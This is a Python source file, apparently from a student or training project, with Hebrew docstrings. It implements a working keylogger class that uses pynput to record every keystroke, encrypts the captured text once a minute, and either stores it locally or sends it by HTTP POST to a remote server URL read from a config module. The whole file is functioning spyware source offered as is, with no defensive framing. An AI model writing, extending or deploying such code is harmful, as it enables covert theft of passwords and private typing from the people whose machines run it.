import threading
import time
import logging

import requests
from pynput import keyboard

from codeK.Key_Logger.key_logger_agent.test import config

logger = logging.getLogger(__name__)


class KeyLogger:
    def __init__(self, encryption_handler, storage_handler, routing: str = 'file'):
        self.encryptor = encryption_handler
        self.storage = storage_handler
        self.routing = routing
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = None
        self.stop_event = False
        self.is_running = False

    def start(self, time_to_run: int = 0):
        """מתחיל להקליט הקשות."""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.is_running = True
        logger.info("Keylogger started listening.")

        if time_to_run <= 0:
            while not self.stop_event:
                time.sleep(60)
                self.save_and_clear()
        else:
            for _ in range(time_to_run):
                time.sleep(60)
                self.save_and_clear()
            self.stop_listen()

    def on_press(self, key):
        """מטפל באירוע לחיצת מקש."""
        with self.lock:
            try:
                key_str = self.format_key(key)
                if key_str:
                    self.current_keys.append(key_str)
            except Exception as e:
                logger.error(f"Error handling key: {e}")

    def format_key(self, key):
        """מפרמט מקשים מיוחדים."""
        if key == keyboard.Key.space:
            return ' '
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return f"[{key.name}]"

    def save_and_clear(self):
        """שומר את ההקשות ומנקה את הרשימה."""
        with self.lock:
            keys_copy = self.current_keys.copy()
            self.current_keys.clear()
        keys_str = ''.join(keys_copy)
        encrypted_data = self.encryptor.encrypt(keys_str)
        if self.routing == 'file':
            self.storage.write_log(encrypted_data)
        else:
            self.send_to_server(encrypted_data)

    def stop_listen(self):
        """מפסיק את ההקלטה."""
        if self.listener:
            self.listener.stop()
        self.stop_event = True
        self.is_running = False
        logger.info("Keylogger stopped listening.")

    def send_to_server(self, data):
        """שולח נתונים לשרת."""
        try:
            response = requests.post(config.SERVER_URL, json={"data": data},
                                     headers={"Content-Type": "application/json"})
            logger.info(f"Data sent to server. Response: {response.status_code}")
        except Exception as e:
            logger.error(f"Failed to send data to server: {e}")
